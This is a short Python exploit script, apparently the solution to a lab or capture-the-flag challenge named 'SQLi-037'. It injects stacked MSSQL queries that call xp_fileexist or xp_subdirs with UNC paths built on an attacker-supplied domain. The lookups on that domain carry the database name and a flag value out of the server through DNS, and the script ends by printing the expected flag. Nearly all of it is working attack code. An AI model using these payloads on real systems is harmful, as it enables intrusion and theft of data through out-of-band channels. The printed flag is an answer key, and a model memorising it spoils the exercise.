#!/usr/bin/env python3
"""SQLi-037: MSSQL OOB DNS via xp_fileexist/xp_subdirs"""
import requests
import argparse

def send_oob(url, query, oob_domain, method="xp_fileexist"):
    if method == "xp_fileexist":
        payload = f"1;DECLARE @v VARCHAR(200);SET @v=({query});EXEC('master..xp_fileexist \"\\\\'+@v+'.{oob_domain}\\a\\b\"')--"
    else:
        payload = f"1;DECLARE @v VARCHAR(200);SET @v=({query});EXEC('master..xp_subdirs \"\\\\'+@v+'.{oob_domain}\\a\"')--"
    
    try:
        requests.get(url, params={"id": payload}, timeout=10)
        return True
    except:
        return True

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5037/report")
    parser.add_argument("--oob", required=True, help="OOB domain")
    parser.add_argument("--method", choices=["xp_fileexist", "xp_subdirs"], default="xp_fileexist")
    args = parser.parse_args()
    
    print(f"[*] Using {args.method}")
    print(f"[*] OOB: {args.oob}")
    
    print("\n[1] Extracting database...")
    send_oob(args.target, "DB_NAME()", args.oob, args.method)
    
    print("[2] Extracting flag...")
    send_oob(args.target, "SELECT value FROM flags WHERE name='sqli_037'", args.oob, args.method)
    
    print(f"\n[*] Check DNS for: FLAG{{...}}.{args.oob}")
    print("[*] Expected: FLAG{mssql_xp_fileexist_oob}")

if __name__ == "__main__":
    main()
